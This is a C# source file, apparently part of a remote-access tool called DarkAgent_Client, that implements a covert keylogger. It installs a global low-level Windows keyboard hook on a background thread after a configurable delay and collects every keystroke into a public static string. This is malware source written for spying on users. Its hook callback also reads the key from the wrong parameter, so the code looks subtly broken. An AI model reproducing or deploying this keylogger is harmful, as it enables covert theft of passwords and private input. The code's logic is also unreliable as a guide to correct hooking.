using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.Reflection;
using DarkAgent_Client.src.Utils;
using System.Threading;

namespace DarkAgent_Client.src.Features
{
    public class Keylogger
    {
        public Keylogger()
        {
            if(Settings.Keylogger_Enable)
                ThreadPool.QueueUserWorkItem(new WaitCallback(EnableKeyLog));
        }

        private void EnableKeyLog(object obj)
        {
            if (Settings.Keylogger_Enable)
            {
                Thread.Sleep(Settings.Keylogger_Delay);
                _hookID = SetHook(_proc);
            }
        }

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public static string KeyStrokes;
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            return SetWindowsHookEx(13, proc, APIs.GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //write stuff in here lol:P
            int KeyId = Marshal.ReadInt32(wParam);
            KeyStrokes += Char.ConvertFromUtf32(KeyId).ToString();
            return APIs.CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}